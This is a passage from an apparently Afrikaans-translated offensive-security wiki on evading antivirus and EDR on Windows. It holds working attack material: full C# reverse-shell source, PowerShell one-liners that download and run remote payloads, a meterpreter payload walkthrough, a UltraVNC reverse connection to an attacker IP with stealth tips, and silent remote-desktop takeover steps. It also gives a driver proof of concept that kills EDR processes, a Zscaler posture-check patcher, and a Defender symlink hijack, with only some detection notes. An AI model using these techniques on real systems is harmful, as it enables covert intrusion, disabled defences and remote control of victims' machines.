'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om dit binne 'n soort container soos 'n ISO te pakket. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** toegepas kan word op **non NTFS** volumes nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in output containers pak om Mark-of-the-Web te ontduik.

Voorbeeld van gebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeure te loog**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Soos hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user space-proses onmiddellik terug te laat keer sonder om enige gebeure te loog. Dit word gedoen deur die funksie in geheue te patch sodat dit dadelik terugkeer, en sodoende ETW-logging vir daardie proses effektief te deaktiveer.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.

Aangesien die payload direk in geheue gelaai word sonder om die skyf te raak, hoef ons net bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels **om 'n nuwe offersproses te spawnen**, die post-exploitation kwaadwillige kode in daardie nuwe proses te inject, jou kwaadwillige kode uit te voer en, wanneer klaar, die nuwe proses te beëindig. Dit het beide voordele en nadele. Die voordeel van die fork-and-run-metode is dat uitvoering plaasvind **buite** ons Beacon implant-proses. Dit beteken dat as iets in ons post-exploitation-aksie verkeerd gaan of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor om die post-exploitation kwaadwillige kode **in sy eie proses** te inject. Op hierdie manier kan jy vermy om 'n nuwe proses te skep wat deur AV gescan word, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om jou beacon te verloor aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

Deur die gekompromitteerde masjien toegang te gee tot die Interpreter Binaries en die omgewing op die SMB-share, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan steeds die skripte, maar deur Go, Java, PHP ens. te gebruik het ons **meer buigbaarheid om statiese handtekeninge te omseil**. Toetsing met ewekansige on-obfuskated reverse shell-skripte in hierdie tale het sukses getoon.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om **die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te manipuleer**, wat hulle in staat stel om die bevoegdhede te verlaag sodat die proses nie sal sterf nie maar ook nie die toestemmings het om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handvatsels oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), dit is eenvoudig om Chrome Remote Desktop op 'n slagoffer se rekenaar te installeer en dit dan te gebruik om dit oor te neem en volhoubaarheid te behou:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Draai die installateur stil in die slagoffer (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik volgende. Die wizard sal jou dan vra om te authoriseer; klik die Authorize-knoppie om voort te gaan.
4. Voer die gegewe parameter met 'n paar aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin sonder die GUI te stel).

## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is byna onmoontlik om heeltemal onaangeroer te bly in volwasse omgewings.

Elke omgewing wat jy teëkom sal sy eie sterk- en swakpunte hê.

Ek moedig jou sterk aan om hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om 'n ingang in meer Advanced Evasion-tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog 'n goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig vind en dit vir jou uitsplits.\
Nog 'n hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens wat die diens aanbied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows 10 het alle Windows-weergawes met 'n **Telnet server** gekom wat jy (as administrator) kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel opstart en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort (onopvallend) en skakel firewall af:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**ON THE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:

- Skakel die opsie _Disable TrayIcon_ aan
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Skuif dan die binêre _**winvnc.exe**_ en die nuut geskepte lêer _**UltraVNC.ini**_ na die **victim**

#### **Reverse connection**

Die **attacker** moet op sy **host** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit voorberei is om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WARNING:** Om stealth te handhaaf, moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie of jy sal 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasie-venster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp hardloop nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige Defender sal die proses baie vinnig beëindig.**

### Kompilering van ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using kompiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik van python vir build injectors voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR in die kernel-ruimte uitskakel

Storm-2603 het 'n klein konsolehulpprogram genaamd **Antivirus Terminator** gebruik om endpoint-beskermings uit te skakel voordat ransomware afgelewer is. Die hulpmiddel bring sy **eie kwesbare maar *signed* driver** en misbruik dit om bevoegde kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike afleidings
1. **Signed driver**: Die lêer wat op skyf gelewer word is `ServiceMouse.sys`, maar die binêre is die wettig gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toegewysbaar word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminering van 'n ewekansige proses per PID (gebruik om Defender/EDR-dienste te stop) |
| `0x990000D0` | Verwyder 'n ewekansige lêer op skyf |
| `0x990001D0` | Laai die driver uit en verwyder die diens |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Hoekom dit werk**: BYOVD slaan user-mode-beskermings heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, hulle terminate, of met kernel-objekte knoei ongeag PPL/PP, ELAM of ander verhardingsfunksies.

Opsporing / Mitigasie
•  Skakel Microsoft se vulnerable-driver bloklys in (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laad.
•  Moniteer die skepping van nuwe *kernel* dienste en gee waarskuwing wanneer 'n driver van 'n world-writable gids gelaai word of nie op die allow-list is nie.
•  Kyk vir user-mode handles na pasgemaakte device objects gevolg deur verdagte `DeviceIoControl`-aanroepe.

### Zscaler Client Connector se postuurkontroles omseil via op-skyf binêre patching

Zscaler se **Client Connector** pas device-posture-reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpskeuses maak 'n volledige omseiling moontlik:

1. Postuur-evaluerings gebeur **heeltemal kliëntkant** (’n boolean word na die bediener gestuur).
2. Interne RPC-endpunte valideer slegs dat die verbindende uitvoerbare lêer **gesigned deur Zscaler** is (via `WinVerifyTrust`).

Deur **vier signed binaries op skyf te patch** kan beide meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` sodat elke kontrole as voldoen beskou word |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC-pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgeskakel |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Alle** posture checks vertoon **green/compliant**.
* Ongesignede of gemodifiseerde binaries kan die named-pipe RPC-endpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer verkry onbeperkte toegang tot die interne netwerk soos deur die Zscaler-beleid gedefinieer.

Hierdie gevallestudie demonstreer hoe suiwer kliënt-side vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patsies omseil kan word.

## Misbruik van Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) afdwing 'n signer/level-hiërargie sodat net beskermde prosesse met gelyke of hoër status mekaar kan manipuleer. Vanuit 'n offensiewe oogpunt, as jy 'n PPL-geskikte binêre lêer legitim kan begin en sy argumente beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in 'n beperkte, deur PPL gesteunde skryf-primitive teen beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL uitgevoer word
- Die teiken EXE (en enige gelaaide DLLs) moet gesigneer wees met 'n PPL-geskikte EKU.
- Die proses moet geskep word met CreateProcess met die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele beskermingsvlak moet aangevra word wat by die signer van die binêre pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde vlakke sal by skepping misluk.

Sien ook 'n breër inleiding tot PP/PPL en LSASS-beskerming hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Oopbron-hulpmiddel: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente na die teiken EXE voort):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruiksvoorbeeld:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die gesigneerde stelsel-binaire `C:\Windows\System32\ClipUp.exe` maak 'n nuwe proses van homself en aanvaar 'n parameter om 'n loglêer na 'n deur die oproeper gespesifiseerde pad te skryf.
- Wanneer as 'n PPL-proses gelanseer, gebeur die lêerskryf met PPL-ondersteuning.
- ClipUp kan nie paadjies met spasies ontleed nie; gebruik 8.3-kortpade om na normaalweg beskermde liggings te wys.

8.3 short path helpers
- Lys kortname: `dir /x` in elke ouer-gids.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Start die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad-argument om 'n lêerskepping in 'n beskermde AV-gids af te dwing (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die teiken-binary normaalweg deur die AV oop/gesluit is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryf by opstart voordat die AV begin deur 'n auto-start diens te installeer wat betroubaar vroeër loop. Valideer die opstartvolgorde met Process Monitor (boot logging).
4) By herlaai gebeur die PPL-ondersteunde skryf voordat die AV sy binaries sluit, wat die teikenlêer korrupteer en die opstart verhinder.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf beheer behalwe vir die ligging nie; die primitief is meer geskik vir korrupsie as vir presiese content injection.
- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/start en 'n herbegin-venster.
- Tydbepaling is krities: die teiken mag nie oop wees nie; uitvoering by opstart vermy file locks.

Detections
- Prosesskepping van `ClipUp.exe` met ongewoonlike argumente, veral wanneer dit deur nie-standaard launchers as ouer geskep word, rondom opstart.
- Nuwe dienste geconfigureer om verdachte binaries outomaties te begin en wat konsekwent voor Defender/AV begin. Ondersoek diensskepping/wysiging voorafgaande aan Defender-opstartfoute.
- Lêerintegriteitsmonitering op Defender binaries/Platform-lêergidse; onverwagte lêerskeppings/wysigings deur prosesse met protected-process vlagte.
- ETW/EDR telemetrie: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale gebruik van PPL-vlak deur nie-AV binaries.

Mitigations
- WDAC/Code Integrity: beperk watter signed binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-aanroep buite geldige kontekste.
- Dienshigiëne: beperk skepping/wysiging van auto-start dienste en monitor begin-volgorde-manipulasie.
- Verseker Defender tamper protection en early-launch protections is aangeskakel; ondersoek opstartfoute wat binêre korrupsie aandui.
- Oorweeg om 8.3 short-name generation op volumes wat security tooling huisves te deaktiveer indien dit versoenbaar is met jou omgewing (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU verwysing: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Tegniek-beskrywing (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulasie van Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder te enumereer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die submap met die hoogste lexikografiese weergawestreng (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse van daar (en werk diens-/registerpaadjies ooreenkomstig by). Hierdie seleksie vertrou gidsinskrywings insluitend directory reparse points (symlinks). 'n Administrateur kan dit misbruik om Defender na 'n deur 'n aanvaller-skryfbare pad te herlei en sodoende DLL sideloading of diensversteuring te bereik.

Preconditions
- Plaaslike Administrator (noodsaaklik om gidse/symlinks onder die Platform folder te skep)
- Vermoë om te herbegin of Defender platform her-seleksie te aktiveer (diensherbegin by opstart)
- Slegs ingeboude instrumente benodig (mklink)

Why it works
- Defender blokkeer skryfaksies in sy eie gidse, maar sy platformseleksie vertrou gidsinskrywings en kies die lexikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/vertroude pad oplos.

Step-by-step (example)
1) Berei 'n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n hoër-weergawe gids-symlink binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-keuse (reboot aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die omgeleide pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe proses-pad onder `C:\TMP\AV\` waar te neem en die dienskonfigurasie/registry wat daardie ligging weerspieël.

Post-exploitation options
- DLL sideloading/code execution: Plaas/vervang DLLs wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat by die volgende begin die geconfigureerde pad nie oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Neem kennis dat hierdie tegniek op sigself nie privilege escalation verskaf nie; dit vereis admin-regte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime‑ontduiking uit die C2‑implant na die teikenmodule self verskuif deur die Import Address Table (IAT) te hook en geselekteerde APIs deur aanvaller‑beheerde, position‑independent code (PIC) te roeteer. Dit generaliseer ontwijking buite die klein API‑oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.

Hoëvlak‑benadering
- Stage 'n PIC blob langs die teikenmodule met 'n reflective loader (prepended of companion). Die PIC moet selfstandig en posisie‑onafhanklik wees.
- Terwyl die host DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT‑inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC‑wrappers te wys.
- Elke PIC‑wrapper voer ontwijkings uit voordat dit tail‑call na die werklike API‑adres maak. Tipiese ontwijkings sluit in:
  - Geheue maskering/de‑maskering rondom die oproep (bv. enkripteer beacon‑regios, RWX→RX, verander bladsyname/toestemmings) en herstel daarna.
